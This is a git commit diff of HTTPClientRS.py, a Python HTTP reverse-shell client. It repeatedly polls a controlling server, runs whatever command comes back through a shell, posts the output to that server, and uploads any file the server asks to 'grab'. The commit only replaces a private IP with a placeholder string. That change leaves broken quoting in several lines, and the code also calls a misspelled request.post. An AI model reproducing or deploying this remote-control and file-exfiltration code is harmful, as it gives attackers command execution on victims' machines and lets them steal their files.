d3e524787de0c6dd1642e011ada7deb6cc13f493
Nikolaos Margaritis <nick.margas@gmail.com>
2017-09-25 13:56:30 +0300

    Update HTTPClientRS.py

--- HTTPClientRS.py
+++ HTTPClientRS.py
@@ -5,7 +5,7 @@ import os
 
 while True:
 
-	req = requests.get("http://192.168.1.3") #IP Address of the server
+	req = requests.get("Server's IP Address") #IP Address of the server
 	command = req.text
 
 	if "terminate" in command: #Terminate the reverse shell
@@ -14,14 +14,14 @@ while True:
 		grab, path = command.split("*")
 
 		if os.path.exists(path):
-			url = "http://192.168.1.3/store"
+			url = "Server's IP Address/store"
 			files = {"file": open(path, "r")}
 			r = requests.post(url, files = files)
 		else:
-			post_response = request.post(url = "http://192.168.1.3", data = "[-] Not able to find the file!")
+			post_response = request.post(url = "http://Server's IP Address", data = "[-] Not able to find the file!")
 	else:
 		CMD = subprocess.Popen(command, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
-		post_response = requests.post(url = "http://192.168.1.3", data = CMD.stdout.read())
-		post_response = requests.post(url = "http://192.168.1.3", data = CMD.stderr.read())
+		post_response = requests.post(url = "Server's IP Address"", data = CMD.stdout.read())
+		post_response = requests.post(url = "Server's IP Address"", data = CMD.stderr.read())
 
 	time.sleep(3)
